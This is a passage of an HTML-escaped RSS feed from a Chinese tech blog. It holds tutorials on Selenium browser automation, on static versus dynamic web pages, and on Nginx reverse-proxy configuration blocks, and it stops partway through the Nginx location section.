#1.创建浏览器对象
browser = webdriver.Edge(executable_path =&amp;quot;D:\GeckoDriver\edgedriver_win64\msedgedriver&amp;quot;)
#2.通过浏览器向服务器发送URL请求
browser.get(&amp;quot;https://www.baidu.com/&amp;quot;)
#3.刷新浏览器
browser.refresh()
#4.设置浏览器的大小
browser.set_window_size(1400,800)
#5.设置链接内容
element=browser.find_element_by_link_text(&amp;quot;新闻&amp;quot;)
element.click()
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;6模拟鼠标操作&#34;&gt;6.模拟鼠标操作&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;| 方法                   | 说明                                                         
| ---------------------- | ------------------------------------------------------------ 
| ActionChains(driver)   | 构造ActionChains对象                                         
| context_click()        | 右击                                                         
| move_to_element(above) | 执行鼠标悬停操作                                             
| double_click()         | 双击                                                         
| drag_and_drop()        | 拖动                                                         
| move_to_element(above) | 执行鼠标悬停操作                                             
| context_click()        | 用于模拟鼠标右键操作， 在调用时需要指定元素定位              
| perform()              | 执行所有 ActionChains 中存储的行为，可以理解成是对整个操作的提交动作 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用举例&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;from selenium import webdriver
#1.引入 ActionChains 类
from selenium.webdriver.common.action_chains import ActionChains
driver = webdriver.Edge(executable_path =&amp;quot;D:\GeckoDriver\edgedriver_win64\msedgedriver&amp;quot;)
driver.get(&amp;quot;https://www.baidu.com&amp;quot;)
#2.定位到要悬停的元素
element= driver.find_element_by_link_text(&amp;quot;设置&amp;quot;)
#3.对定位到的元素执行鼠标悬停操作
ActionChains(driver).move_to_element(element).perform()
#寻找链接
elem1=driver.find_element_by_link_text(&amp;quot;搜索设置&amp;quot;)
elem1.click()
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;7模拟键盘操作&#34;&gt;7.模拟键盘操作&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;| 模拟键盘按键               | 说明                
| -------------------------- | ------------------- 
| send_keys(Keys.BACK_SPACE) | 删除键（BackSpace） 
| send_keys(Keys.SPACE)      | 空格键(Space)       
| send_keys(Keys.TAB)        | 制表键(Tab)         
| send_keys(Keys.ESCAPE)     | 回退键（Esc）       
| send_keys(Keys.ENTER)      | 回车键（Enter）     
| send_keys(Keys.CONTROL,&#39;a&#39;) | 全选（Ctrl+A） 
| send_keys(Keys.CONTROL,&#39;c&#39;) | 复制（Ctrl+C） 
| send_keys(Keys.CONTROL,&#39;x&#39;) | 剪切（Ctrl+X） 
| send_keys(Keys.CONTROL,&#39;y&#39;) | 粘贴（Ctrl+V） 
| send_keys(Keys.F1…Fn)       | 键盘 F1…Fn     
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用举例&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;from selenium import webdriver
from selenium.webdriver.common.keys import Keys
browser = webdriver.Edge(executable_path =&amp;quot;D:\GeckoDriver\edgedriver_win64\msedgedriver&amp;quot;)
browser.get(&amp;quot;https://www.baidu.com&amp;quot;)
elem=browser.find_element_by_id(&amp;quot;kw&amp;quot;)
elem.send_keys(&#39;Selenium&#39;)
elem.send_keys(Keys.ENTER)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;8断言&#34;&gt;8.断言&lt;/h2&gt;
&lt;p&gt;我们可以采用以下属性作为断言参考&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;| 属性        | 说明                   
| ----------- | ----------------------
| title       | 用于获得当前页面的标题 
| current_url | 用户获得当前页面的URL  
| text        | 获取搜索条目的文本信息 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用举例&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;title = driver.title
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;9等待&#34;&gt;9.等待&lt;/h2&gt;
&lt;h3 id=&#34;1强制等待强制等待sleep--from-time-import-sleep&#34;&gt;1.强制等待：强制等待sleep()  【from time import sleep】&lt;/h3&gt;
&lt;p&gt;这种强制等待，无论浏览器是否加载完成，程序都要等待，等待时间够了才继续执行下面的代码，可以作为调试时候使用，但是过于死板，可能会影响程序执行速度&lt;/p&gt;
&lt;h3 id=&#34;2隐性等待implicity_wait&#34;&gt;2.隐性等待：implicity_wait()&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;driver.implicitly_wait(30)  # 隐性等待，最长等30秒
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;隐性等待设置了一个最长等待时间，如果在规定时间内页面加载完成，则执行下一步，否则一直等到时间截止，然后执行下一步， 弊端：程序会一直等待整个页面加载完成，就是一般情况下你看到浏览器标签栏那个小圈不再转，才会执行下一步，但有时候页面想要的元素早就在加载完成了，但是因为个别js之类的东西特别慢，我仍得等到页面全部完成才能执行,这时需要显性等待&lt;/p&gt;
&lt;h3 id=&#34;3显性等待webdriverwait&#34;&gt;3.显性等待：WebDriverWait()&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
element = WebDriverWait(driver, 5, 0.5).until(EC.presence_of_element_located((By.ID, &amp;quot;kw&amp;quot;)
# WebDriverWait(driver, 超时时长, 调用频率, 忽略异常).until(可执行方法, 超时时返回的信息)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;需要配合该类的until()和until_not()方法，主要意思是：程序每隔xx秒看一眼，如果条件成立了，则执行下一步，否则继续等待，直到超过设置的最长时间，然后抛出TimeoutException。&lt;/p&gt;
&lt;h2 id=&#34;10其他方法&#34;&gt;10.其他方法&lt;/h2&gt;
&lt;h3 id=&#34;a多表单切换&#34;&gt;a.多表单切换&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;| 方法                        | 说明                                              
| --------------------------- | -------------------------------------------------- 
| switch_to.frame()           | 将当前定位的主体切换为frame/iframe表单的内嵌页面中
| switch_to.default_content() | 跳回最外层的页面                               
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;b多窗口切换&#34;&gt;b.多窗口切换&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;| 方法                  | 说明                                                         
| --------------------- | ------------------------------------------------------------ 
| current_window_handle | 获得当前窗口句柄                                             
| window_handles        | 返回所有窗口的句柄到当前会话                                
| switch_to.window()    | 用于切换到相应的窗口
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;c警告框处理&#34;&gt;c.警告框处理&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;| 方法                  | 说明                                               
| --------------------- | -------------------------------------------------- 
| text                  | 返回 alert/confirm/prompt 中的文字信息             
| accept()              | 接受现有警告框                                     
| dismiss()             | 解散现有警告框                                     
| send_keys(keysToSend) | 发送文本至警告框。keysToSend：将文本发送至警告框。 
| switch_to_alert       | 切换到alert
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;d下拉框选择操作&#34;&gt;d.下拉框选择操作&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;from selenium.webdriver.support.select import Select
| 方法                              | 说明                      
| --------------------------------- | ------------------------- 
| select_by_value(&amp;quot;选择值&amp;quot;)         | select标签的value属性的值 
| select_by_index(&amp;quot;索引值&amp;quot;)         | 下拉框的索引              
| select_by_visible_testx(&amp;quot;文本值&amp;quot;) | 下拉框的文本值           
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;e文件上传&#34;&gt;e.文件上传&lt;/h3&gt;
&lt;p&gt;通过send_keys()指定本地文件路径的方式实现文件上传&lt;/p&gt;
&lt;h3 id=&#34;fcookie操作&#34;&gt;f.cookie操作&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;| 方法                              | 说明                                                       
| --------------------------------- | ----------------------------------------------------------
| get_cookies()                     | 获得所有cookie信息                                           
| get_cookie(name)                  | 返回字典的key为“name”的cookie信息                            
| add_cookie(cookie_dict)           | 添加cookie。“cookie_dict”指字典对象，必须有name 和value 值   
| delete_cookie(name,optionsString) | 删除cookie信息。“name”是要删除的cookie的名称，“optionsString”是该cookie的选项
| delete_all_cookies()              | 删除所有cookie信息                                           
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;g窗口截图&#34;&gt;g.窗口截图&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;| 方法                                   | 说明                                
| -------------------------------------- | ------------------------------------ 
| get_screenshot_as_file(self, filename) | 用于截取当前窗口，并把图片保存到本地 
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;h关闭浏览器&#34;&gt;h.关闭浏览器&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;| 方法    | 说明         
| ------- | ------------ 
| close() | 关闭单个窗口 
| quit()  | 关闭所有窗口 
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;f获取网站源码&#34;&gt;f.获取网站源码&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;| 方法    | 说明         
| ------- | ------------ 
| page_source | 获取网站源码 
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Web服务器—动-静态网页</title>
        <link>https://ac-lm.github.io/posts/web/web%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8A%A8-%E9%9D%99%E6%80%81%E7%BD%91%E9%A1%B5/</link>
        <pubDate>Wed, 04 Mar 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8A%A8-%E9%9D%99%E6%80%81%E7%BD%91%E9%A1%B5/</guid>
        <description>&lt;h2 id=&#34;1静态网页&#34;&gt;1.静态网页&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;在静态 Web 程序中，客户端使用 Web 浏览器通过网络，使用 HTTP 协议向服务器发送一个请求（Request），告诉服务器需要得到某个页面，之后 Web 服务器会根据用户的需要，从文件系统（存放了所有静态页面的磁盘）取出内容返回给客户端，客户端接收到内容之后经过浏览器渲染解析，得到显示的效果。&lt;/li&gt;
&lt;li&gt;运行在客户端的程序、网页、插件、组件，属于静态网页，它们可以脱离服务器运行于浏览器客户端。&lt;/li&gt;
&lt;li&gt;静态网页的内容相对稳定，URL 地址相对于动态网页的更加容易被搜索引擎识别,所以网站进行 SEO 优化的时候一般都是建议采用静态网页。&lt;/li&gt;
&lt;li&gt;静态网页无需数据库的支持，所以访问速度上较之动态网页比较快，不过随着浏览器以及宽带速度提升，这种差别会越来越小。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;2动态网页&#34;&gt;2.动态网页&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;动态 Web 中，程序依然使用客户端和服务端，客户端依然使用浏览器通过 HTTP 协议发送请求（Request），但现在的所有请求都要先经过一个 Web Server来处理。&lt;/li&gt;
&lt;li&gt;如果客户端请求的是静态资源，则将请求直接转交给 Web 服务器，之后 Web 服务器从文件系统中取出内容，发送回客户端浏览器进行解析执行。&lt;/li&gt;
&lt;li&gt;如果客户端请求的是动态资源，则先将请求转交给 Web Container，在 Web Container 中连接数据库，从数据库中取出数据并完成一系列操作后，动态拼凑页面的展示内容，最后把所有的展示内容交给 Web 服务器返回。&lt;/li&gt;
&lt;li&gt;运行在服务器端的程序、网页、组件，属于动态网页，它们会随不同客户、不同时间，返回不同的网页。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;3静态网页和动态网页的区别&#34;&gt;3.静态网页和动态网页的区别&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;静态页面中，设计者把页面上所有东西都设定好，不管是谁在任何时候看到的页面内容都是一样的。静态网页的页面文件，可以直接用本地的浏览器打开。静态页面放到什么地方都能运行的，动态页面则不行。&lt;/li&gt;
&lt;li&gt;程序是否在服务器端运行，这个是判断网页属不属于动态网页的重要标志。动态网页需要服务器进行解析，动态网页的内容一般都是依靠服务器端的程序来生成的，不同人、不同时候访问页面，页面显示的内容都可能不同。&lt;/li&gt;
&lt;li&gt;动态网页相比静态网页的交互性更高，可以实现更多的功能，如用户注册、登录等一系列用户需要与网站发生互动的功能。需要注意的是动态网页与网页上的各种动画、滚动字幕等视觉上的“动态效果”没有直接关系，动态网页的动态关注的是用户与服务器的数据交互。&lt;/li&gt;
&lt;li&gt;动态网页不是一个独立存在服务器上的网页，当用户发送请求时，服务器可能还要拼凑其他元素才会返回一个完整的网页，而静态网页一旦上传到服务器上，就是实实在在保存在服务器上的网页文件。&lt;/li&gt;
&lt;li&gt;静态网页适合更新较少的网站，一般适用于展示型的网站，而动态网页则更新较多，一般用于用户互动较多的网站。&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>Web服务器—Nginx 反向代理</title>
        <link>https://ac-lm.github.io/posts/web/web%E6%9C%8D%E5%8A%A1%E5%99%A8nginx-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</link>
        <pubDate>Mon, 02 Mar 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E6%9C%8D%E5%8A%A1%E5%99%A8nginx-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</guid>
        <description>&lt;h2 id=&#34;1正向代理与反向代理&#34;&gt;1.正向代理与反向代理&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;正向代理隐藏了真实的请求客户端，服务端不知道真实的客户端是谁，客户端通过代理服务器来访问服务端，客户端所有的请求都通过代理服务器来发送&lt;/strong&gt;。某些科学上网工具就是典型的正向代理角色，通过在国外搭建一台代理服务器，让代理代替我去发送请求，然后代理服务器再把响应返回给我。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;反向代理隐藏了真实的服务端，客户不知道真正提供服务人的是谁，客户只需要访问反向代理服务器便可以获取到响应&lt;/strong&gt;。例如，当我们请求百度的时候，可能有成千上万台服务器准备为我们服务，而我们不需要知道是哪台服务器为我们提供服务，只需要知道反向代理服务器 &lt;a class=&#34;link&#34; href=&#34;http://www.baidu.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.baidu.com&lt;/a&gt; 就可以了。反向代理服务器会帮我们把请求转发到真实的服务器。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;两者的区别在于代理的对象不一样：  正向代理是为客户端代理，反向代理是为服务端代理。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在现代，通常会使用 Nginx 作为反向代理服务器。&lt;/p&gt;
&lt;h2 id=&#34;2nginx的配置文件&#34;&gt;2.Nginx的配置文件&lt;/h2&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051055087.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051055087.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;1全局块&#34;&gt;1.全局块&lt;/h3&gt;
&lt;p&gt;该部分配置 Nginx 全局内容，包括下面几个部分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;配置运行 Nginx 服务器用户（组）&lt;/li&gt;
&lt;li&gt;worker process 数&lt;/li&gt;
&lt;li&gt;Nginx 进程 PID 存放路径&lt;/li&gt;
&lt;li&gt;错误日志的存放路径&lt;/li&gt;
&lt;li&gt;外部配置文件的引入&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;[group]&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;nobody&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;nobody&lt;/span&gt;; 
&lt;span style=&#34;color:#75715e&#34;&gt;# 指定可以运行 Nginx 服务器的用户，如果 user 指令不配置或者配置为 nobody nobody，则默认所有用户都可以启动 Nginx 进程
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;-------------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;worker_processes&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;number&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# number：Nginx 进程最多可以产生的 worker process 数，配置为 auto：Nginx 进程将自动检测
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;-------------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;error_log&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;file&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# file：日志输出到某个文件 file，配置为 stderr 日志输出到标准错误输出
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;error_log&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;logs/error.log&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;# 将日志输出到 logs/error.log
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;pid&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;file&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# file：指定存放路径和文件名称，不指定默认置于路径 logs/nginx.pid
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;----更多配置---------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;file&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# 该指令主要用于将其他的 Nginx 配置或者第三方模块的配置引用到当前的主配置文件中
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;accept_mutex&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;on&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# 该指令默认为 on 状态，表示会对多个 Nginx 进程接收连接进行序列化，防止多个进程对连接的争抢
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;multi_accept&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;off&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# 该指令默认为 off 状态，意指每个 worker process 一次只能接收一个新到达的网络连接。若想让每个 Nginx 的 worker process 都有能力同时接收多个网络连接，则需要开启此配置
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2events-块&#34;&gt;2.Events 块&lt;/h3&gt;
&lt;p&gt;该部分配置 Nginx 服务器与用户的网络连接事件，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置网络连接的序列化&lt;/li&gt;
&lt;li&gt;是否允许同时接收多个网络连接&lt;/li&gt;
&lt;li&gt;事件驱动模型的选择&lt;/li&gt;
&lt;li&gt;最大连接数的配置&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;model&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# 事件驱动模型的选择，可选择项包括：select、poll、kqueue、epoll、rtsig
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;----------------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;worker_connections&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;number&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# 最大连接数的配置，number 默认值为 512，表示允许每一个 worker process 可以同时开启的最大连接数
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;3http-块&#34;&gt;3.Http 块&lt;/h3&gt;
&lt;p&gt;这部分是负责网页相关的配置&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;定义 MIMI-Type&lt;/li&gt;
&lt;li&gt;自定义服务日志&lt;/li&gt;
&lt;li&gt;允许 sendfile 方式传输文件&lt;/li&gt;
&lt;li&gt;连接超时时间&lt;/li&gt;
&lt;li&gt;单连接请求数上限&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt; mime.types;
&lt;span style=&#34;color:#66d9ef&#34;&gt;default_type&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;mime-type&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# 定义 MIME-Type 网络资源的媒体类型，也即前端请求的资源类型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# mime.types 是一个 types 结构文件，里面包含了各种浏览器能够识别的 MIME 类型以及对应类型的文件后缀名字
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;----------------------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;access_log&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;path&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;[format]&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# path：自定义服务日志的路径 + 名称
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# format：可选项，自定义服务日志的字符串格式。其也可以使用 log_format 定义的格式
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;----------------------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;sendfile&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;on&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;sendfile_max_chunk&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;size&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# 前者用于开启或关闭使用 sendfile() 传输文件，默认 off
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 后者指令若 size&amp;gt;0，则Nginx进程的每个 worker process 每次调用 sendfile() 传输的数据了最大不能超出此值；若 size=0 则表示不限制。默认值为 0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;---------------------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;keepalive_timeout&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;timeout&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;[header_timeout]&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# 连接超时时间配置，timeout 表示 server 端对连接的保持时间，默认75秒
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# header_timeout 为可选项，表示在应答报文头部的 Keep-Alive 域设置超时时间：&amp;#34;Keep-Alive : timeout = header_timeout&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;-----更多配置---------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;keepalive_requests&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;number&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# 单连接请求数上限，用于限制用户通过某一个连接向Nginx服务器发起请求的次数
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;4server-块&#34;&gt;4.Server 块&lt;/h3&gt;
&lt;p&gt;这部分是负责服务器相关的配置&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;配置网络监听&lt;/li&gt;
&lt;li&gt;基于名称的虚拟主机配置&lt;/li&gt;
&lt;li&gt;基于IP的虚拟主机配置&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;listen&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;IP[:PORT]&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;listen&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;PORT&lt;/span&gt;;                  &lt;span style=&#34;color:#75715e&#34;&gt;# 配置监听的IP地址 或 配置监听的端口
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;listen&lt;/span&gt; 192.168.31.177:&lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;;   &lt;span style=&#34;color:#75715e&#34;&gt;# 监听具体IP和具体端口上的连接
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;listen&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;192&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.168.31.177&lt;/span&gt;;        &lt;span style=&#34;color:#75715e&#34;&gt;# 监听IP上所有端口上的连接
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;listen&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;;                  &lt;span style=&#34;color:#75715e&#34;&gt;# 监听具体端口上的所有IP的连接
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;5location-块&#34;&gt;5.Location 块&lt;/h3&gt;
&lt;p&gt;本地文件配置&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;请求根目录配置&lt;/li&gt;
&lt;li&gt;更改 location 的 URI&lt;/li&gt;
&lt;li&gt;网站默认首页配置&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;location&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;[&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt; ~ &lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt; ~&lt;span style=&#34;color:#e6db74&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;^~&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;uri&lt;/span&gt; {&lt;span style=&#34;color:#f92672&#34;&gt;...}&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# 这里的 uri 分为标准 uri 和正则 uri
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# &amp;#34;=&amp;#34;：用于标准 uri 前，要求请求字符串与 uri 严格匹配，一旦匹配成功则停止
